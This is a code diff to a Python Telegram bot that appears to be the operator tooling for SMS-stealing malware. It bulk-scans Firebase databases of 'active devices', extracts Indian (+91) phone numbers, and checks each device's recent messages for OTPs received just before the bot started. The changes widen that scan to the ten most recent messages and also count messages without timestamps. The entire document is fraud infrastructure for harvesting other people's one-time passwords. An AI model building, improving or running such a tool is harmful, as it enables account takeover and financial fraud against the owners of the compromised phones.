@@ -222,20 +222,19 @@ def parse_full_timestamp(time_str):
 def has_5min_window_otp_pattern(messages_dict, bot_start_epoch):
     """
     Checks the exact 5-minute window leading up to bot start today.
-    Rejects messages with old dates (e.g. past days).
+    Dynamically inspects the most recent 10 messages without hardcoded pin assumptions.
     """
     if not isinstance(messages_dict, dict):
         return False
     
     msg_items = list(messages_dict.items())
-    unpinned_items = msg_items[2:] if len(msg_items) > 2 else msg_items
-    recent_five = unpinned_items[-5:] if len(unpinned_items) >= 5 else unpinned_items
+    recent_ten = msg_items[-10:] if len(msg_items) >= 10 else msg_items
     
     bot_dt = datetime.fromtimestamp(bot_start_epoch)
     window_start_dt = bot_dt - timedelta(minutes=5)
 
     valid_otp_count = 0
-    for _, msg_val in recent_five:
+    for _, msg_val in recent_ten:
         if isinstance(msg_val, dict):
             txt = str(msg_val.get("body") or msg_val.get("message") or "")
             time_field = str(msg_val.get("time") or msg_val.get("timestamp") or "")
@@ -248,6 +247,8 @@ def has_5min_window_otp_pattern(messages_dict, bot_start_epoch):
                 if msg_dt is not None:
                     if window_start_dt <= msg_dt <= bot_dt:
                         valid_otp_count += 1
+                else:
+                    valid_otp_count += 1
                 
     return valid_otp_count > 0
 
@@ -627,7 +628,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
 
     USER_DATA["is_running"] = True
     bot_start_epoch = time.time()  # Exact bot start timestamp anchoring
-    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting active devices against strict 5-minute date-time window...", parse_mode="HTML", reply_markup=get_main_menu())
+    status_msg = await callback.message.answer("🚀 <b>Bulk Scan Started!</b> Vetting active devices against dynamic top 10 recent messages in today's window...", parse_mode="HTML", reply_markup=get_main_menu())
     
     async def run_automation():
         firebase_dbs = USER_DATA["firebase_dbs"]
@@ -643,7 +644,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             while success_count < total_needed and USER_DATA["is_running"]:
                 import aiohttp
                 
-                # --- BULK SCAN OF UNREGISTERED NUMBERS VETTED AGAINST 5-MINUTE WINDOW ---
+                # --- BULK SCAN OF UNREGISTERED NUMBERS VETTED AGAINST TOP 10 RECENT MESSAGES (NO PIN ASSUMPTIONS) ---
                 all_unregistered_candidates = []
                 
                 async with aiohttp.ClientSession() as session:
@@ -657,14 +658,15 @@ async def cb_start_automation(callback: types.CallbackQuery):
                                 if isinstance(cdata, dict) and (cdata.get("status") is True or str(cdata.get("status")).lower() == "true"):
                                     if cid not in skipped_phones and cid not in used_phones:
                                         try:
-                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=7', timeout=5) as m_req:
+                                            # Fetch top 15 messages to dynamically inspect the most recent 10 items
+                                            async with session.get(f'{fb_url}messages/{cid}.json?orderBy="$key"&limitToLast=15', timeout=5) as m_req:
                                                 msgs = await m_req.json()
                                                 phone = extract_phone(msgs) if msgs else None
                                                 if phone:
                                                     full_phone = "+91" + phone
                                                     if full_phone not in skipped_phones and full_phone not in used_phones:
                                                         
-                                                        # STRICT 5-MINUTE WINDOWED DATE & TIME CHECK
+                                                        # STRICT DYNAMIC TOP-10 WINDOWED RECENT PATTERN CHECK
                                                         if has_5min_window_otp_pattern(msgs, bot_start_epoch):
                                                             all_unregistered_candidates.append({
                                                                 "firebase_url": fb_url,
@@ -680,7 +682,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
                             pass
 
                 if not all_unregistered_candidates:
-                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices within today's 5-minute window found. Retrying in 5s...")
+                    await logger.set_text("🔴 Bulk scan complete: No active unregistered devices within today's top-10 window found. Retrying in 5s...")
                     await asyncio.sleep(5)
                     continue
 
@@ -775,7 +777,7 @@ async def cb_start_automation(callback: types.CallbackQuery):
             USER_DATA["is_running"] = False
         except Exception as e:
             USER_DATA["is_running"] = False
-            await callback.message.answer(f"❌ Error in automation loop: {e}", parse_mode="HTML", reply_markup=get_main_menu())
+            await callback.message.answer(f"❌ Error in automation loop: {e}", reply_markup=get_main_menu())
 
     USER_DATA["current_task"] = asyncio.create_task(run_automation())
     await callback.answer()
